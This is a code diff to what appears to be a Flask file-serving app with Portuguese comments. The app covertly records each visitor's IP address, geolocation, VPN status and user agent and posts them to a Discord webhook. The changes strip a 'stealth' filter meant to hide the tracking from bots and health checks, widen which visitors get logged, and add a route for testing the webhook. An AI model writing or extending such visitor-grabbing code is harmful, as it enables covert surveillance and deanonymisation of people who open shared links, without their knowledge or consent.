@@ -116,27 +116,7 @@ EXT_CATEGORIES = {
 # ============================================================
 
 def is_filtered_request():
-    """Verifica se a request deve ser ignorada (stealth)"""
-    ip = request.remote_addr or "0.0.0.0"
-    ua = request.headers.get("User-Agent", "").lower()
-    
-    # Filtra IPs privados/localhost
-    if ip in FILTERED_IPS:
-        return True
-    for prefix in FILTERED_IP_PREFIXES:
-        if ip.startswith(prefix):
-            return True
-    
-    # Filtra bots e health checks
-    if request.headers.get("X-Forwarded-For"):
-        fwd_ip = request.headers.get("X-Forwarded-For").split(",")[0].strip()
-        if fwd_ip.startswith("10.") or fwd_ip.startswith("172.") or fwd_ip.startswith("192.168."):
-            return True
-    
-    for kw in FILTERED_UA_KEYWORDS:
-        if kw in ua:
-            return True
-    
+    """Desligado pra funcionar no Render e outros clouds"""
     return False
 
 
@@ -347,15 +327,14 @@ def get_file_by_name(filename):
 
 
 # ============================================================
-# 📤 WEBHOOK ULTRA PREMIUM
+# 📤 WEBHOOK CORRIGIDO
 # ============================================================
 
 def send_webhook(action="visit", file_name=""):
-    if is_filtered_request():
-        return
-    
     ip = get_client_ip()
-    if ip.startswith("10.") or ip.startswith("172.") or ip.startswith("192.168."):
+    
+    # Só filtra localhost real — NÃO filtra IPs privados de cloud
+    if ip in ["127.0.0.1", "::1", "0.0.0.0"]:
         return
     
     ua_str = request.headers.get("User-Agent", "Unknown")
@@ -392,7 +371,7 @@ def send_webhook(action="visit", file_name=""):
     else:
         title = f"{status_emoji} 👁️ VISIT — {ip}"
     
-    # Monta embed com 3 colunas perfeitas
+    # Monta embed
     embed = {
         "embeds": [{
             "title": title,
@@ -459,7 +438,7 @@ def send_webhook(action="visit", file_name=""):
         flag = "VPN" if vpn.get("is_vpn") else "REAL"
         city = geo.get("city", "?")
         country = geo.get("country", "?")
-        print(f"[{flag}] {ip} | {city}/{country} | {file_name or 'Home'} | ID:{visit_id}")
+        print(f"[{flag}] {ip} | {city}/{country} | {file_name or 'Home'} | ID:{visit_id} | Status:{r.status_code}")
     except Exception as e:
         print(f"[!] Webhook: {e}")
 
@@ -524,6 +503,28 @@ def security():
     resp = make_response("Contact: mailto:security@example.com\nPreferred-Languages: en, pt-BR\n")
     resp.headers["Content-Type"] = "text/plain"
     return resp
+
+
+@app.route("/test_webhook")
+def test_webhook():
+    """Rota de diagnóstico pra testar a webhook manualmente"""
+    test_payload = {
+        "embeds": [{
+            "title": "🧪 TESTE WEBHOOK",
+            "color": 0x9b59b6,
+            "description": "Se você está vendo isso, a webhook está funcionando perfeitamente!",
+            "timestamp": datetime.utcnow().isoformat() + "Z"
+        }]
+    }
+    try:
+        r = requests.post(DISCORD_WEBHOOK_URL, json=test_payload, timeout=10)
+        return jsonify({
+            "status": r.status_code,
+            "response": r.text[:300],
+            "working": r.status_code == 204
+        })
+    except Exception as e:
+        return jsonify({"error": str(e)})
 
 
 @app.errorhandler(404)
